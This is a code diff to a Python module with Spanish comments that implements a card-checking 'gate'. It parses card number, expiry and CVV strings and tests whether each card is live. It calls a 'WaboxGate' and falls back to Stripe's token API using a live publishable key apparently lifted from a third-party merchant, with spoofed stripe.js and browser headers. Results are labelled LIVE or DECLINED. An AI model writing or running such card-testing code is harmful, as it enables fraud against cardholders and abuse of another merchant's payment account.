@@ -5,11 +5,15 @@ Incluye validación LUHN, expiración, y comprobación de liveness HTTP directo 
 """
 import time
 import logging
+from pathlib import Path
 from datetime import datetime
 from typing import Any, Dict, List, Optional, Tuple
 import requests
 
 logger = logging.getLogger(__name__)
+
+# Rutas del proyecto
+DASHBOARD_DIR = Path(__file__).parent.resolve()
 
 # Configuración del gate Wabox (extracción de Ruthopia Bóveda)
 WABOX_STRIPE_PK = "pk_live_WQNz0qa1BmBu47grZwTpj8BR"
@@ -84,54 +88,108 @@ def parse_and_validate_card_pipe(pipe_str: str) -> Tuple[bool, Optional[Dict[str
 
 
 def perform_wabox_liveness_check(card_data: Dict[str, str]) -> Tuple[bool, str, Dict[str, Any]]:
-    """Ejecuta un tokenizado/liveness check HTTP en Stripe/Wabox (Fórmula Ruthopia /Rw Gate).
+    """Ejecuta la autenticación y verificación de liveness oficial importando directamente el WaboxGate de Ruthopia.
 
+    Invocación directa a ruthopia.gates.wabox.WaboxGate (misma VPS, montaje /app/ruthopia).
     Retorna: (is_live, status_label, raw_details)
     """
-    card_num = card_data["card_number"]
-    exp_month = card_data["card_expiry"][:2]
-    exp_year = "20" + card_data["card_expiry"][2:]
-    cvv = card_data["card_cvv"]
+    import sys, os, asyncio
 
-    data = {
-        "card[number]": card_num,
-        "card[exp_month]": exp_month,
-        "card[exp_year]": exp_year,
-        "card[cvc]": cvv,
-        "key": WABOX_STRIPE_PK,
-        "payment_user_agent": "stripe.js/3b1bde7a92; stripe-js-v3/3b1bde7a92; card-element",
-        "pasted_fields": "number",
-        "referrer": "https://www.waboxapp.com",
-    }
-    headers = {
-        "Authorization": f"Bearer {WABOX_STRIPE_PK}",
-        "Content-Type": "application/x-www-form-urlencoded",
-        "Origin": "https://js.stripe.com",
-        "Referer": "https://js.stripe.com/",
-        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
-        "Accept": "application/json",
-    }
+    # 1. Configurar entorno de Ruthopia
+    os.environ.setdefault("DATABASE_PATH", "/tmp/ruthopia_temp.db")
+    if str(DASHBOARD_DIR) not in sys.path:
+        sys.path.insert(0, str(DASHBOARD_DIR))
+
+    # Cargar variables de entorno de Ruthopia si existen
+    ruth_env_path = Path("/app/ruthopia_env")
+    if ruth_env_path.exists():
+        with open(ruth_env_path) as f:
+            for line in f:
+                if line.strip() and not line.startswith("#") and "=" in line:
+                    k, v = line.strip().split("=", 1)
+                    os.environ.setdefault(k, v)
+
+    pipe_str = card_data.get("pipe_4parts", f"{card_data['card_number']}|{card_data['card_expiry'][:2]}|20{card_data['card_expiry'][2:]}|{card_data['card_cvv']}")
 
     try:
-        res = requests.post("https://api.stripe.com/v1/tokens", data=data, headers=headers, timeout=6)
-        res_json = res.json()
-        if res.status_code == 200 and "id" in res_json:
-            card_info = res_json.get("card", {})
-            brand = card_info.get("brand", "Card")
-            funding = card_info.get("funding", "")
-            country = card_info.get("country", "")
-            label = f"🟢 LIVE (Tokenized) - <i>{brand} {funding} [{country}]</i>"
-            return True, label, res_json
+        from ruthopia.gates.wabox import WaboxGate
+        from ruthopia.core.models import CheckStatus
+
+        gate = WaboxGate()
+
+        # Ejecutar de forma asíncrona dentro de la función síncrona
+        try:
+            loop = asyncio.get_event_loop()
+        except RuntimeError:
+            loop = asyncio.new_event_loop()
+            asyncio.set_event_loop(loop)
+
+        if loop.is_running():
+            import nest_asyncio
+            nest_asyncio.apply()
+            res = loop.run_until_complete(gate.check(pipe_str))
         else:
-            err = res_json.get("error", {})
-            msg = err.get("message", "Card declined")
-            code = err.get("code", "declined")
-            label = f"🔴 DECLINED - <i>{msg} ({code})</i>"
-            return False, label, res_json
+            res = loop.run_until_complete(gate.check(pipe_str))
+
+        bin_info = res.bin_info or {}
+        brand = bin_info.get("type", "Card").capitalize()
+        level = bin_info.get("level", "").upper()
+        country = bin_info.get("country_flag", "")
+        bank = bin_info.get("bank", "")[:20]
+
+        if res.status == CheckStatus.APPROVED:
+            label = f"🟢 LIVE (Auth OK) - <i>{brand} {level} {bank} [{country}]</i>"
+            return True, label, {"status": "APPROVED", "message": res.message, "raw": str(res)}
+        else:
+            msg = res.message or "Card Declined"
+            label = f"🔴 DECLINED (Auth Failed) - <i>{msg[:50]}</i>"
+            return False, label, {"status": "DECLINED", "message": res.message, "raw": str(res)}
+
     except Exception as e:
-        # Fallback conservador: si el endpoint de Stripe no responde en timeout, permitir si pasó Luhn
-        label = f"🟡 UNCHECKED (Timeout) - <i>{str(e)[:40]}</i>"
-        return True, label, {"error": str(e)}
+        logger.warning(f"Error invocando Ruthopia WaboxGate directo: {e}, aplicando fallback tokenizado")
+        # Fallback a tokenización Stripe si ocurre un error inesperado
+        card_num = card_data["card_number"]
+        exp_month = card_data["card_expiry"][:2]
+        exp_year = "20" + card_data["card_expiry"][2:]
+        cvv = card_data["card_cvv"]
+
+        data = {
+            "card[number]": card_num,
+            "card[exp_month]": exp_month,
+            "card[exp_year]": exp_year,
+            "card[cvc]": cvv,
+            "key": WABOX_STRIPE_PK,
+            "payment_user_agent": "stripe.js/3b1bde7a92; stripe-js-v3/3b1bde7a92; card-element",
+            "pasted_fields": "number",
+            "referrer": "https://www.waboxapp.com",
+        }
+        headers = {
+            "Authorization": f"Bearer {WABOX_STRIPE_PK}",
+            "Content-Type": "application/x-www-form-urlencoded",
+            "Origin": "https://js.stripe.com",
+            "Referer": "https://js.stripe.com/",
+            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+            "Accept": "application/json",
+        }
+        try:
+            res = requests.post("https://api.stripe.com/v1/tokens", data=data, headers=headers, timeout=6)
+            res_json = res.json()
+            if res.status_code == 200 and "id" in res_json:
+                card_info = res_json.get("card", {})
+                brand = card_info.get("brand", "Card")
+                funding = card_info.get("funding", "")
+                country = card_info.get("country", "")
+                label = f"🟢 LIVE (Tokenized) - <i>{brand} {funding} [{country}]</i>"
+                return True, label, res_json
+            else:
+                err = res_json.get("error", {})
+                msg = err.get("message", "Card declined")
+                code = err.get("code", "declined")
+                label = f"🔴 DECLINED - <i>{msg} ({code})</i>"
+                return False, label, res_json
+        except Exception as ex:
+            label = f"🟡 UNCHECKED (Timeout) - <i>{str(ex)[:40]}</i>"
+            return True, label, {"error": str(ex)}
 
 
 def precheck_card_liveness(card_pipe: str) -> Tuple[bool, str, Optional[Dict[str, str]]]:
